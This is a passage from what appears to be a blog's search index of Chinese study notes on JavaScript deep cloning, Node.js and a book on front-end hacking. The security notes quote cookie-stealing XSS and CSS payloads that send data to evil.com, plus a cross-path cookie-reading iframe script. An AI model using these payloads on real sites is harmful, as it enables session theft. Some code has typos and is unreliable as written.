、RegExp等特殊对象的克隆，保留对象的constructor,对象有循环引用也不会报错</p>\n<p>参考 <a href=\"https://juejin.im/post/5abb55ee6fb9a028e33b7e0a\">https://juejin.im/post/5abb55ee6fb9a028e33b7e0a</a></p>\n<pre><code class=\"language-javascript\">const getType = (obj)=&gt; {\n    var toString = Object.prototype.toString;\n    var map = {\n        &#39;[object Boolean]&#39;  : &#39;boolean&#39;, \n        &#39;[object Number]&#39;   : &#39;number&#39;, \n        &#39;[object String]&#39;   : &#39;string&#39;, \n        &#39;[object Function]&#39; : &#39;function&#39;, \n        &#39;[object Array]&#39;    : &#39;array&#39;, \n        &#39;[object Date]&#39;     : &#39;date&#39;, \n        &#39;[object RegExp]&#39;   : &#39;regExp&#39;, \n        &#39;[object Undefined]&#39;: &#39;undefined&#39;,\n        &#39;[object Null]&#39;     : &#39;null&#39;, \n        &#39;[object Object]&#39;   : &#39;object&#39;,\n        &#39;[object Symbol]&#39;   : &#39;symbol&#39;\n    };\n    if(obj instanceof Element) {//因为对不同标签，toString会返回对应不同标签的构造函数\n        return &#39;element&#39;;\n    }\n    return map[toString.call(obj)];\n}\n\nconst getRegExp = re =&gt; {\n  var flags = &#39;&#39;;\n  if (re.global) flags += &#39;g&#39;;\n  if (re.ignoreCase) flags += &#39;i&#39;;\n  if (re.multiline) flags += &#39;m&#39;;\n  return flags;\n};\n\n/**\n* deep clone\n* @param  {[type]} parent object 需要进行克隆的对象\n* @return {[type]}        深克隆后的对象\n*/\nconst deepClone = oldObj =&gt; {\n  // 维护两个储存循环引用的数组\n  const oldObjArr = [];\n  const newObjArr = [];\n\n  const clone = oldObj =&gt; { \n\n    let newObj, proto;\n\n    const type = getType(oldObj);\n\n    switch(type){\n        case &#39;boolean&#39;:\n        case &#39;number&#39;:\n        case &#39;string&#39;:\n        case &#39;null&#39;:\n        case &#39;undefined&#39;:\n        case &#39;function&#39;:{\n            return oldObj;\n            break;\n        }\n        case &#39;symbol&#39;:{\n            return Symbol(Symbol.keyFor(oldObj).toString());\n            break;\n        }\n        case &#39;array&#39;:{\n            newObj = [];\n            break;\n        }\n        case &#39;regExp&#39;:{\n            newObj = new RegExp(oldObj.source, getRegExp(oldObj));\n            if (oldObj.lastIndex) newObj.lastIndex = oldObj.lastIndex;\n            break;\n        }\n        case &#39;date&#39;:{\n            newObj = new Date(oldObj.getTime());            \n            break;\n        }\n        //case &#39;obj&#39;:\n        default:{\n            // 处理对象原型\n            proto = Object.getPrototypeOf(oldObj);\n            // 利用Object.create切断原型链\n            newObj = Object.create(proto);\n            break;\n        }\n   }\n\n   // 处理循环引用\n   const index = oldObjArr.indexOf(oldObj);\n   if (index != -1) {// 如果父数组存在本对象,说明之前已经被引用过,直接返回此对象    \n     return newObjArr[index];\n   }\n\n   oldObjArr.push(oldObj);\n   newObjArr.push(newObj);\n\n   for (let i in oldObj) {// 递归   ,这里数组和对象都可以用forin语句，但是数组使用forin会有一个问题，具体看最下面。但是这里不会影响  \n     newObj[i] = clone(oldObj[i]);\n   }\n\n   return newObj;\n };\n\n\n return clone(oldObj);\n}\n\n/*\n测试通过\n*/\nfunction person(pname) {\n    this.name = pname;\n}\n\nconst Messi = new person(&#39;Messi&#39;);\n\nfunction say() {\n    console.log(&#39;hi&#39;);\n};\n\nconst oldObj = {\n    a: say,\n    b: new Array(1),\n    c: new RegExp(&#39;ab+c&#39;, &#39;i&#39;),\n    d: Messi\n  };\n\n  const newObj = deepClone(oldObj);\n\n  console.log(newObj.a, oldObj.a); //[Function: say] [Function: say]\n  console.log(newObj.b[0], oldObj.b[0]); // undefined undefined\n  console.log(newObj.c, oldObj.c); // /ab+c/i /ab+c/i\n  console.log(newObj.d.constructor, oldObj.d.constructor); // [Function: person][Function: person]\n</code></pre>\n<h2 id=\"tostring和typeof区别\">toString和typeof区别</h2>\n<p>之前一直不知道这两个有什么区别，所以这次好好研究一下，探索出来这样的关系\n {% asset_img toString_typeof.png %}</p>\n<p>下面是一些测试例子</p>\n<pre><code class=\"language-javascript\">var toString = Object.prototype.toString;\n\nlet a= true;\nconsole.log(typeof(a));//boolean\nconsole.log(toString.call(a));//[object Boolean]\n\na=new Boolean(true);\nconsole.log(typeof(a));//object \nconsole.log(toString.call(a));//[object Boolean]\n\n\na=new RegExp(&#39;ab+c&#39;, &#39;i&#39;);\nconsole.log(a.source)//ab+c\nconsole.log(a.global)//false\nconsole.log(a.ignoreCase)//true\nconsole.log(a.multiline)//false\nconsole.log(a.lastIndex)//0\n\nconsole.log(typeof(a));//object\nconsole.log(toString.call(a));//[object RegExp]\n\n\nfunction say() {\n  console.log(&#39;hi&#39;);\n};\na=say;\nconsole.log(typeof(a));//function\nconsole.log(toString.call(a));//[object Function]\n\na=[1,2,3,4,5];\n(let i in a){\nconsole.log(a[i])\n}\nconsole.log(typeof(a));//object\nconsole.log(toString.call(a));//[object Array]\n\na=Symbol(&#39;foo&#39;);\nconsole.log(typeof(a));//symbol\nconsole.log(toString.call(a));//[object Symbol]\n\n</code></pre>\n<h2 id=\"数组使用for-in\">数组使用for in</h2>\n<p>for in函数中变量以字符串的形式出现，这时候在函数中操作a[x+1]的话是无效的，x+1会进行字符串拼接。</p>\n<pre><code class=\"language-javascript\">var a=[5,4,3,2,1];\n        var x=0;\n        console.log(typeof x);//number\n        for (x in a) {\n            console.log(&quot;a[&quot;+x+&quot;]: &quot;+a[x]);\n            console.log(typeof x);//string\n        }\n        console.log(x);//4\n        console.log(typeof x);//string\n//output:\n//        a[0]: 5\n//        a[1]: 4\n//        a[2]: 3\n//        a[3]: 2\n//        a[4]: 1</code></pre>\n","index":16},{"filePath":"post\\2018\\6\\webSafety.md","htmlPath":"/post/2018/6/webSafety.html","name":"webSafety.md","type":"md","title":"读《web前端黑客技术揭秘》","date":"2018/6/1","categories":"Reading","tags":"读书笔记","html":"<h3 id=\"xss-跨站脚本攻击\">XSS 跨站脚本攻击</h3>\n<p>如果攻击者构造出如下链接：\n<a href=\"http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)\">http://www.foo.com/info.html#new%20Image().src=&quot;http://www.evil.com/steal.php?c=&quot;+escape(document.cookie)</a>\n浏览器解释执行后，下面的语句：\neval(location.hash.substr(1));\n会变为：\neval(&#39;new Image().src=&quot;<a href=\"http://www.evil.com/steal.php?c=&quot;+escape\">http://www.evil.com/steal.php?c=&quot;+escape</a>(document.\ncookie)&#39;)\nCookies 会话信息就会被盗取到黑客的网站上</p>\n<h3 id=\"csrf\">CSRF</h3>\n<p>CSRF 是跨站请求伪造，CSRF 会借用目标用户的权限做一些借刀杀人的事（注意是“借用”，而不是“盗取”\n目标权限），然后去做坏事，\n“盗取”通常是XSS（跨站脚本攻击）最喜欢做的事。</p>\n<h3 id=\"apt\">APT</h3>\n<p>APT（持久化威胁）攻击\n如果是个反射型的XSS，IE 8/IE 9/Chome 直接就给拦截了。</p>\n<h3 id=\"无状态的http\">无状态的HTTP</h3>\n<p>HTTP 是无状态的，那么每次在连接时，服务端如何知道你是上一次的那个？\n这里通过Cookies 进行会话跟踪，第一次响应时设置的Cookies 在随后的每次请求中都会发\n送出去。Cookies 还可以包括登录认证后的身份信息。</p>\n<h3 id=\"响应资源的类型与字符集\">响应资源的类型与字符集</h3>\n<p>Content-Type: text/html;charset=gbk\n响应资源的类型与字符集。针对不同的资源类型会有不同的解析方式，这个会影响浏\n览器对响应体里的资源解析方式，可能因此带来安全问题。字符集也会影响浏览器的解码\n方式，同样可能带来安全问题。</p>\n<h3 id=\"set-cookie\">Set-Cookie</h3>\n<p>Set-Cookie: USERID=c7888882e039b32fd7b4d3; expires=Tue, 01 Jan 2030\n00:00:00 GMT; path=/; domain=.foo.com\n每个 Set-Cookie 都设置一个Cookie（key=value 这样），随后是如下内容。\nexpires：过期时间，如果过期时间是过去，那就表明这个Cookie 要被删。\npath：相对路径，只有这个路径下的资源可以访问这个Cookie。\ndomain：域名，不允许设为下一级子域或其他外域，可以指定为父级域\nHttpOnly：标志（默认无，如果有的话，表明Cookie 存在于HTTP 层面，不能被客户\n端脚本读取）。\nSecure：标志（默认无，如果有的话，表明Cookie 仅通过HTTPS 协议进行安全传输）。但是Secure Cookie 对于客户端脚本来说是可读写的。可读意味着\nSecure Cookie 能被盗取，可写意味着能被篡改。</p>\n<h3 id=\"iframe\">iframe</h3>\n<p>攻击者入侵一个网站后，可以通过iframe 嵌入自己的网马页面，用户访问该网站后，被嵌入的网马页面就会执行</p>\n<p>当网站页面使用iframe 方式嵌入一个页面时，\n我们约定网站页面是父页，而被嵌入的这个页面是子页。那么父页与子页之间如何跨文档读写数据？\n如果父页和子页之间是同域，那就很容易，父页可以通过调用子页的contentWindow\n来操作子页的DOM 树，同理，子页可以调用父页的contentWindow 来操作父页的DOM 树。\n如果它们不同域，则必须遵守同源策略，但子页还是可以对父页的location 值进行写操作，\n这样可以让父页重定向到其他网页，不过对location 的操作仅仅只有写权限，而没有读权\n限，这样就不能获取到父页location URL 的内容，否则有可能会造成隐私数据泄漏，</p>\n<h3 id=\"跨域\">跨域</h3>\n<p> <a href=\"http://www.foo.com%EF%BC%88%E6%9D%A5%E6%BA%90%E5%9F%9F%EF%BC%89%E7%9A%84AJAX\">www.foo.com（来源域）的AJAX</a> 向<a href=\"http://www.evil.com%EF%BC%88%E7%9B%AE%E6%A0%87%E5%9F%9F%EF%BC%89%E5%8F%91%E8%B5%B7%E4%BA%86%E8%AF%B7%E6%B1%82%EF%BC%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BC%9A\">www.evil.com（目标域）发起了请求，浏览器会</a>\n给自动带上Origin 头，如下：\nOrigin: <a href=\"http://www.foo.com\">http://www.foo.com</a>\n然后目标域要判断这个Origin 值，如果是自己预期的，那么就返回：\nAccess-Control-Allow-Origin: <a href=\"http://www.foo.com\">http://www.foo.com</a>\n表示同意跨域</p>\n<p>如果目标域不设置Access-Control-Allow-Origin: <a href=\"http://www.foo.com%EF%BC%8C%E9%82%A3%E4%B9%88%E9%9A%90%E7%A7%81%E6%95%B0%E6%8D%AE%E5%8F%AF\">http://www.foo.com，那么隐私数据可</a>\n以被偷到吗？答案是肯定的。虽然浏览器会报权限错误的问题，但实际上隐私数据已经被\n目标域的steal.php 接收到了。</p>\n<h3 id=\"跨域带上会话\">跨域带上会话</h3>\n<p>默认情况下，跨域不会带上目标域的会话（Cookies 等），需要设置xhr 实例的withCredentials 属性为true（IE 还不支持），同时目标域的steal.php 必须设置如下：\n<?php\nheader(\"Access-Control-Allow-Origin: http://www.foo.com\");\nheader(\"Access-Control-Allow-Credentials: true\"); // 允许跨域证书发送\n//...\n?>\n有 一 点 需 要 注 意 ， 如 果设置了Access-Control-Allow-Credentials 为true ， 那么\nAccess-Control-Allow-Origin 就不能设置为*通配符</p>\n<h3 id=\"跨路径读取cookie\">跨路径读取Cookie</h3>\n<p>那么有什么办法跨路径读取Cookie？比如，/evil/路径想读取/admin/路径的Cookie。很简单，通过跨iframe 进行\nDOM 操作即可，/evil/路径下页面的代码如下：</p>\n<pre><code class=\"language-javascript\">xc = function(src){\nvar o = document.createElement(&quot;iframe&quot;); // iframe 进入同域的目标页面\no.src = src;\ndocument.getElementsByTagName(&quot;body&quot;)[0].appendChild(o);\no.onload = function(){ // iframe 加载完成后\nd = o.contentDocument || o.contentWindow.document;\n// 获取document 对象\nalert(d.cookie); // 获取cookie\n};\n}(&#39;http://a.foo.com/admin/index.php&#39;);</code></pre>\n<p>所以，通过设置path 不能防止重要的Cookie 被盗取。</p>\n<h3 id=\"本地cookie-与内存cookie\">本地Cookie 与内存Cookie</h3>\n<p>如果没设置过期时间，就是内存Cookie，这样的Cookie 会随着浏览器的关闭而从内存中消失；如果设置了\n过期时间是未来的某个时间点，那么这样的Cookie 就会以文本形式保存在操作系统本地，\n待过期时间到了才会消失。</p>\n<h3 id=\"p3p\">P3P</h3>\n<p>HTTP 响应头的P3P（Platform for Privacy Preferences Project）字段是W3C 公布的一项\n隐私保护推荐标准。该字段用于标识是否允许目标网站的Cookie 被另一个域通过加载目标\n网站而设置或发送，仅IE 执行了该策略。\n比如，evil 域通过script 或iframe 等方式加载foo 域（此时foo 域被称为第三方域）。\n加载的时候，有两种场景</p>\n<ol>\n<li><p>浏览器是否会允许foo 域设置自己的Cookie</p>\n<p> 在IE 下默认都是不允许第三方域设置域已有的Cookie的，除非foo 域在<code>响应的时候带上P3P 字段</code></p>\n</li>\n<li><p>浏览器是否允许发送请求到foo 域时，带上foo 域已有的Cookie</p>\n<p> 发送的Cookie 如果是内存Cookie，则无所谓是否有P3P 属性，就可以正常发送；如果\n 是本地Cookie，则这个本地Cookie 必须拥有P3P 属性，否则，即使目标域响应了P3P 头\n 也没用。</p>\n<h3 id=\"ie的userdata\">IE的userData</h3>\n<pre><code class=\"language-javascript\">function set_ud(key,value) {\n var a = document.getElementById(&#39;x&#39;); // x 为任意div 的id 值\n a.addBehavior(&quot;#default#userdata&quot;);\n a.setAttribute(key,value);\n a.save(&quot;db&quot;);\n}\nfunction get_ud(key) {\n var a = document.getElementById(&#39;x&#39;);\n a.addBehavior(&quot;#default#userdata&quot;);\n a.load(&quot;db&quot;);\n alert(a.getAttribute(key));\n}\nfunction del_ud(key) {\n var a = document.getElementById(&#39;x&#39;);\n a.addBehavior(&quot;#default#userdata&quot;);\n a.setAttribute(key, &quot;&quot;); // 设置为空值即可\n a.save(&quot;db&quot;);\n}\nwindow.onload = function(){\n set_ud(&#39;a&#39;,&#39;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;); // 设置\n get_ud(&#39;a&#39;); // 获取a 的值\n del_ud(&#39;a&#39;); // 删除a 的值\n get_ud(&#39;a&#39;); // 获取a 的值\n};</code></pre>\n<h3 id=\"flashcookie\">FlashCookie</h3>\n<pre><code class=\"language-actionScript\">function set_lso(k:String=&quot;default&quot;, v:String=&quot;&quot;):void\n{ // 设置值\n var shared:SharedObject = SharedObject.getLocal(&quot;db&quot;);\n shared.data[k] = v;\n shared.flush();\n}\nfunction get_lso(k:String=&quot;default&quot;):String\n{ // 获取值\n var str:String = &quot;&quot;;\n var shared:SharedObject = SharedObject.getLocal(&quot;db&quot;);\n str = shared.data[k];\n return str;\n}\nfunction clear_lso():void\n{ // 清空值\n var shared:SharedObject = SharedObject.getLocal(&quot;db&quot;);\n shared.clear();\n}</code></pre>\n</li>\n</ol>\n<h3 id=\"函数劫持很简单\">函数劫持很简单</h3>\n<p>一般情况下，只要在目标函数触发之前，重写这个函数即可</p>\n<h3 id=\"css\">css</h3>\n<pre><code class=\"language-css\">#a2:visited {background: url(http://www.evil.com/css/steal.php?data=a2);}</code></pre>\n","index":17},{"filePath":"post\\2018\\7\\node.md","htmlPath":"/post/2018/7/node.html","name":"node.md","type":"md","title":"《深入浅出node.js》、慕课网","date":"2018/7/5","categories":"Reading","tags":"读书笔记","html":"<h1 id=\"《深入浅出nodejs》\">《深入浅出node.js》</h1>\n<p>适合高并发、IO密集型、事件驱动</p>\n<ul>\n<li><p>服务端</p>\n<pre><code class=\"language-javascript\">http.createServer(function(ServerRequest, ServerResponse){\n  //监听\n  ServerRequest.on(&#39;data&#39;,function(chunk){})\n  ServerRequest.on(&#39;end&#39;,function(){})\n  ServerRequest.on(&#39;close&#39;,function(){})\n  //响应\n  ServerResponse.writeHead(200,{&#39;Content-Type&#39;:&#39;text/plain&#39;})\n  ServerResponse.write(&#39;hello&#39;)\n  ServerResponse.end()\n}).listen(3000)</code></pre>\n</li>\n<li><p>客户端</p>\n<pre><code class=\"language-javascript\">options = {\n  host:&#39;&#39;,\n  hostname\n  localAdrress\n  socketPath\n  auth\n  agent\n  keepAlive\n  keepAliveMsecs\n  port:&#39;&#39;,\n  method:&#39;&#39;,\n  path:&#39;&#39;,\n  headers:&#39;&#39;\n}\nvar clientRequest = http.request(options,function(clientResponse){\n  clientResponse.setEncoding()\n  clientResponse.pause()\n  clientResponse.resume()\n  clientResponse.on(&#39;data&#39;,function(data){\n      console.log(Buffer.isBuffer(chunk));//true\n      console.log(typeof chunk)//Object\n  })//不断被触发,流\n  clientResponse.on(&#39;end&#39;,function(){})\n  clientResponse.on(&#39;close&#39;,function(){})\n</code></pre>\n</li>\n</ul>\n<p>})</p>\n<p>clientRequest.write(请求体)\nclientRequest.end()\nclientRequest.on(&#39;error&#39;,function(e){console.log(e.message)})\nclientRequest.abort()\nclientRequest.setTimeout()\nclientRequest.setNoDelay()</p>\n<pre><code>\n\n\n## 文件加载方式\n&gt; 按路径加载\n\n    require以&#39;/&#39;开头的，以绝对路径方式加载\n    require以&#39;./&#39;或&#39;../&#39;开头的，以相对路径加载\n&gt;查找node_modules文件夹\n\n    在当前目录下的node_modules中查找=&gt;\n    父目录node_modules找=&gt;\n    上一层目录的node_modules找。。。。。\n    一层一层向上\n\n\n## 异步I/O原理\n事实上，javascript是单线程的，**Node自身其实是多线程的**，只是I/O线程使用的CPU较少。\n除了用户代码无法并行执行外，所有的I/O（磁盘I/O和网络I/O等）都是可以并行执行的。\n\n{% asset_img async-io.png %}\n\n## 非I/O异步的方法\n非I/O异步的方法：``setTimeout``,``setInterval``,``setImmediate``,``process.nextTick``\n\n### ``setTimeout``,``setInterval``\n调用``setTimeout``,``setInterval``创建的定时器会被插入到定时器观察者内部的一个红黑树里面。每次Tick执行，就从改红合数中迭代去除定时器对象，检查是否超过定时时间。如果超过，就形成一个事件，回调函数立即执行\n\n{% asset_img setTimeout.png %}\n\n### ``process.nextTick`` VS ``setTimeout(function(){},0)``\n立即执行一个异步任务可以用``process.nextTick``。\n\n``setTimeout(function(){},0)``需要动用到红黑树，创建定时器对象和迭代操作等操作，较浪费性能，复杂度为O(lg(n)。\n\nnextTick只会将回调函数放入队列中，在下一轮Tick时取出执行，复杂度为O(1)。\n\n### ``setImmediate``  VS ``process.nextTick``\n\n``process.nextTick``优先级大于 ``setImmediate`` 。因为时间循环对观察者的检查是有先后顺序的，``process.nextTick``属于idle观察者，``setImmediate``属于check观察者。在每一个时间循环检查中，**观察者检查顺序：idle---I/O---check**\n\n``process.nextTick``的回调保存在一个**数组**中。\n``setImmediate``的回调保存在一个**链表**中\n\n``process.nextTick``在一个事件循环中会将所有回调函数全部执行完。``setImmediate``每一个时间循环只会执行一个回调。\n\n### 异常处理\n对异步方法进行try/catch操作只可以捕获**当次**事件循环里面的异常\n\nsolution:Node在处理异常上形成一种约定，将异常作为回调函数的第一个实参传回。\n\n需要睡眠阻塞代码调用setTimeout更好，不要用下面的代码.这段代码会持续占用CPU，与真正的sleep相去甚远\n```javascript\nvar s =new Date();\nwhile(neW Date()-s&lt;100){}</code></pre><h3 id=\"异步编程解决方案\">异步编程解决方案</h3>\n<p>EventProxy 是对 events.EventEmitter 的补充，可以自由订阅组合事件</p>\n<ul>\n<li><p>EventProxy:\n  all,\n  tail,\n  after,\n  fail,\n  done(传入all)</p>\n</li>\n<li><p>promise/deferred</p>\n</li>\n</ul>\n<p>{% asset_img promise-deferred.png %}</p>\n<h4 id=\"流程控制库\">流程控制库</h4>\n<ul>\n<li><p>async</p>\n<p>  series 只适合无依赖的串行执行，若当前一个的结果是后一个调用的输入的时候，就不能满足需求.</p>\n<p>  parallel 并行</p>\n<p>  waterfall 有依赖的串行执行</p>\n<p>  auto 可以根据依赖关系自动分析，以最佳的顺序执行业务</p>\n<p>  queue 动态添加并行任务</p>\n<p>  parallelLimit 无法动态添加并行任务</p>\n</li>\n<li><p>step</p>\n</li>\n<li><p>wind 做到了不阻塞CPU但阻塞代码的目的</p>\n</li>\n<li><p>bagPipe:对异步API添加过载保护。可以添加任意类型的异步任务，也可以动态添加异步任务，还能够在实时处理场景中加入拒绝模式（若等待的队列也慢了，新来的调用就直接返回一个队列太满的拒绝异常）和超时控制</p>\n</li>\n</ul>\n<h2 id=\"内存\">内存</h2>\n<p>V8 的垃圾回收会引起Javascript线程<code>暂停执行</code>，回收的内存越多，时间就会被耽搁得越长。所以造成了V8的内存限制。</p>\n<ul>\n<li><p>通过赋值方式解除引用更好</p>\n<p>  想主动释放变量，可以通过delete或者重新赋值进行删除。但是在V8中delete操作有可能干扰V8的优化，所以通过赋值方式解除引用更好</p>\n<pre><code class=\"language-javascript\">  delete global.foo ;\n  global.foo = undefined//or null</code></pre>\n</li>\n<li><p>在正常的Javascript中，无法立即回收的有<code>闭包</code>和<code>全局变量引用</code>这两种情况</p>\n</li>\n<li><p>闭包\n  实现外部作用域访问内部作用域变量</p>\n<p>  它的问题在于，一旦有变量引用了这个中间函数，这个中间函数将不会释放，同事会使原始的作用域也得不到释放，作用域中产生的内存占用也不会得到释放。除非不再有引用，才会逐步释放</p>\n</li>\n<li><p>内存</p>\n<p>  进程的内存包括rss(常驻内存)、交换区swap中一部分和文件系统中一部分</p>\n<p>  {% asset_img v8-heap.png %}</p>\n<p>  Node的内存使用并非都是通过V8进行分配的，那些不是通过V8进行分配的内存叫做 <strong>堆外内存</strong>.利用堆外内存可以突破内存限制</p>\n<p> 堆外内存 + v8堆内存(<code>process.memoryUsage()</code>) = rss</p>\n<p> Buffer对象不经过V8的内存分配机制</p>\n<p> 内存泄露的实质只有一个：就是应当回收的对象出现意外而没有被回收，变成了常驻在老生代中的对象。原因有：</p>\n<ol>\n<li><p>缓存（相当于全局变量保存一些东西）保存太多，没有过期淘汰策略。解决方案：使用进程外的缓存，进程自身不存储。</p>\n</li>\n<li><p>队列消费不及时。解决方案：需要有拒绝策略和超时策略</p>\n</li>\n<li><p>作用域未释放</p>\n<p>stream模块用于处理大文件。如果不需要字符串层面的操作，则不需要借助V8来处理，可以尝试纯粹的Buffer来操作，这就不会受到V8的堆内存限制。但是这个大片使用内存的情况依然要小心，即使V8不限制堆内存的大小，物理内存依然有限制</p>\n</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"buffer\">Buffer</h2>\n<p>Node在内存的使用上采用的是在C++层面<strong>申请</strong>内存、在Javascript中<strong>分配</strong>内存的策略。</p>\n<p>宽字节字符串被截断的问题可以用setEncoding()解决。原因在于，在调用setEncoding()的时候，可读流对象在内部设置了一个decoder对象。每次data事件都通过该decoder对象进行Buffer到字符串的解码，然后再进行下一步。decoder来自于string_decoder模块的StringDecoder实例对象，StringDecoder知道编码后会自行决定输出哪些字节，不输出哪些字节，保证字节不会被截断。但是setEncoding不能从根本上解决该问题。</p>\n<p>更好的解决方法是把多个小Buffer对象拼接成一个Buffer对象（concat方法），然后通过iconv-lite一类的模块来转码。</p>\n<h2 id=\"tcp\">TCP</h2>\n<p>在node中，TCP默认启用Nagle算法，要求缓冲区的数据达到一定数量或一定时间后才将其发出，所以小数据包会被合并，优化网络。\n可以调用socket.setNoDelay(true)取消Nagle算法，使得write()可以立即发送数据到网络中。\n并不是每次write()都会触发一次data事件。在关闭掉Nagle后，另一端可能会将接收到的多个小数据包合并，然后只触发一次data事件.</p>\n<h2 id=\"其他\">其他</h2>\n<p>事件驱动的实质：主循环+事件触发</p>\n<p>为了充分利用浏览器缓存，提高页面的加载速度，在生产环境中常常会向静态文件的文件名添加MD5戳，即使用bundle_[hash].js,而不是bundle.js。\n这里的[hash]会在构建时被盖chunk内容的MD5结果替换，以实现内容不变则文件名不变的效果。</p>\n<p>幂等 ：重复请求多次与请求一次的效果是一样的。</p>\n<p>Node模块分为<strong>核心模块</strong>和<strong>文件模块</strong></p>\n<p>文件模块没有扩展名时，会按照顺序优先加上后缀 <code>.js=&gt;.json=&gt;.ndoe</code></p>\n<ul>\n<li><p>url网址解析</p>\n<p>  <code>url.parse(string,bool,bool)</code> URL字符串=&gt;解析对象</p>\n<p>  <code>url.format(obj)</code> 解析对象=&gt;URL</p>\n<p>  <code>url.resolve(a,b)</code> 连接</p>\n</li>\n</ul>\n<ul>\n<li><p>querystring 参数处理小利器</p>\n<p>  <code>querystring.parse</code> 字符串=&gt;JSON 反序列化</p>\n<p>  <code>querystring.stringify</code> JSON=&gt;字符串 序列化</p>\n<p>  <code>querystring.escape</code> 编码转义</p>\n<p>  <code>querystring.unescape</code></p>\n</li>\n</ul>\n<pre><code class=\"language-javascript\">server = new HttpServer()\n\nserver.on(&#39;request&#39;,function(req,res){})\n//上面一句相当于=&gt;\nserver.listen(3000)</code></pre>\n<h1 id=\"慕课网\">慕课网</h1>\n<ul>\n<li>DNS查找过程</li>\n</ul>\n<ol>\n<li>浏览器搜索自身的DNS缓存</li>\n<li>搜索操作系统自身的DNS缓存</li>\n<li>读取本地的HOST文件</li>\n<li>浏览器发起一个DNS系统调用</li>\n<li>宽带运营商服务器查看本身缓存</li>\n<li>运营商服务器发起迭代DNS解析的请求</li>\n</ol>\n<h3 id=\"http模块\">HTTP模块</h3>\n<pre><code>什么是回调？\n什么是同步/异步？\n什么是I/O？\n什么是单线程/多线程？\n什么是阻塞/非阻塞？\n什么是事件？\n什么是事件驱动？\n什么是基于事件驱动的回调？\n什么是事件循环？</code></pre><h3 id=\"上下文\">上下文</h3>\n<pre><code class=\"language-javascript\">var pet = {\n    speak :function(){\n        console.log(this ===pet)//true\n    }\n}\n\nfunction pet(){\n    console.log(this===global)//true\n}\n\nfunction pet(){\n    this.word=&quot;miaomiao&#39;;\n    this.speak = function(){\n        console.log(this)//cat\n    }\n}\nvar cat =new pet();</code></pre>\n<p>this通常指向当前函数的拥有者，叫做执行上下文</p>\n<pre><code class=\"language-javascript\">function Pet(word){\n    this.word = word;\n    this.speak = function(){\n        console.log(this.word);\n    }\n}\nfunction Dog(word){\n    Pet.call(this,word);//Pet的this指向当前的Dog,相当于继承\n}\nvar dog = new Dog(&#39;wang&#39;);\ndog.speak()</code></pre>\n<h3 id=\"cheerio\">cheerio</h3>\n<p>cheerio可以像jquery一样，解析html代码</p>\n<pre><code class=\"language-javascript\">var $ = cheerio.load(html);\nvar chapters = $(&#39;.learnchapter&#39;);\nchapters.each(function(item){\n    var c =$(this);\n    var chapterTitle = c.find(&#39;strong&#39;).text();\n    var vedio = c.find(&#39;.vedio&#39;).children(&#39;li&#39;);\n})</code></pre>\n<h3 id=\"events模块\">events模块</h3>\n<pre><code class=\"language-javascript\">var EventEmitter =require(&#39;events&#39;).EventEmitter;\nvar life = new EventEmitter();\n\nlife.on(eventname,function(){console.log(1)});\nlife.on(eventname,function(){console.log(2)});\nlife.on(eventname,function(){console.log(3)});\nlife.on(eventname,function(){console.log(4)});\n...\n\nvar haseventname = life.emit(eventname,args)//返回有没有监听过\n\nlife.removeListener(eventname,functionname)//移除\nlife.removeAllListener(eventname)//批量移除\n\nlife.listeners(eventname)//所有监听器\n\nEventEmitter.listenerCount(life,eventname)\n</code></pre>\n<p>默认一个事件不要超过10个监听器，不然内容泄露.可以进行设置</p>\n<pre><code class=\"language-javascript\">life.setMaxListeners(0)//去掉限制\nlife.setMaxListeners(11)//最多11个</code></pre>\n<h3 id=\"buffer暂存\">Buffer暂存</h3>\n<p>Buffer 二进制数据。因为JS的字符串是utf-8存储的，处理二进制的能力弱。</p>\n<pre><code class=\"language-javascript\">var buf = new Buffer([1,2.11,3.22,4]);\nconsole.log(buf[1])//2</code></pre>\n<h5 id=\"转换图片为base64\">转换图片为base64</h5>\n<pre><code class=\"language-javascript\">var fs = require(&#39;fs&#39;);\nfs.readFile(&#39;logo.png&#39;,function(err,origin_buff){\n    fs.writeFile(&#39;logo_buffer.png&#39;.origin_buff,function(){\n        if(err) console.log(err)\n    })\n    var base64Img=origin_buff.toString(&#39;base64&#39;)\n    var decodedImg = new Buffer(base64Img ,&#39;base64&#39;)//拼装成data:image/png,base64,decodedImg才可使用\n    console.log(Buffer.compare(origin_buff,decodedImg))//0\n\n})</code></pre>\n<h3 id=\"stream-边读边写\">Stream 边读边写</h3>\n<h5 id=\"转换图片为base64-1\">转换图片为base64</h5>\n<pre><code class=\"language-javascript\">//stream_logo.js\nvar fs = require(&#39;fs&#39;);\nfs.writeFileSync(&#39;stream_logo.png&#39;,fs.readFileSync(&#39;logo.png&#39;));//大文件会爆仓</code></pre>\n<pre><code class=\"language-javascript\">var fs = require(&#39;fs&#39;);\nvar n = 0;\nvar readStream = fs.createReadStream(&#39;stream_logo.js&#39;)\nreadStream\n.on(&#39;data&#39;,function(chunk){\n    n++\n    console.log(Buffer.isBuffer(chunk));//true 一次大概64TB\n    console.log(chunk.toString(&#39;utf8&#39;));//stream_logo.js内容\n    readStream.pause();\n    setTimeout(function(){\n        readStream.resume()\n    },3000)\n})\n.on(&#39;readable&#39;,function(){})\n.on(&#39;end&#39;,function(){ console.log(n)})\n.on(&#39;close&#39;,function(){})\n.on(&#39;error&#39;,function(){})\n\n</code></pre>\n<h5 id=\"复制文件\">复制文件</h5>\n<pre><code class=\"language-javascript\">var fs = require(&#39;fs&#39;);\nvar readStream = fs.createReadStream(&#39;1.mp4&#39;);\nvar writeStream = fs.createWriteStream(&#39;copy.mp4&#39;);\nreadStream.on(&#39;data&#39;,function(chunk){\n    if(writeStream.write(chunk)===false){//数据还在缓存区，读得快写得慢\n        readStream.pause();//先暂停\n    }\n})\nwriteStream.on(&#39;drain&#39;,function(chunk){//已经写完了\n    readStream.resume();  \n})\nreadStream.on(&#39;end&#39;,function(chunk){\n    writeStream.end()\n})\n</code></pre>\n<h5 id=\"强大的pipe\">强大的Pipe</h5>\n<p>Duplex双工\nTransform双工，但是不存储数据</p>\n<pre><code class=\"language-javascript\">http.createServer(function(req,res){\n    // fs.readFile(&#39;logo.png&#39;,function(err,data){\n    //     if(err){\n    //         res.end(&#39;file is not exist!&#39;)\n    //     }else{\n    //         res.writeHead(200，{‘Content-Type&#39;:&#39;text/html&#39;});\n    //         res.end(data)\n    //     }\n    // })\n    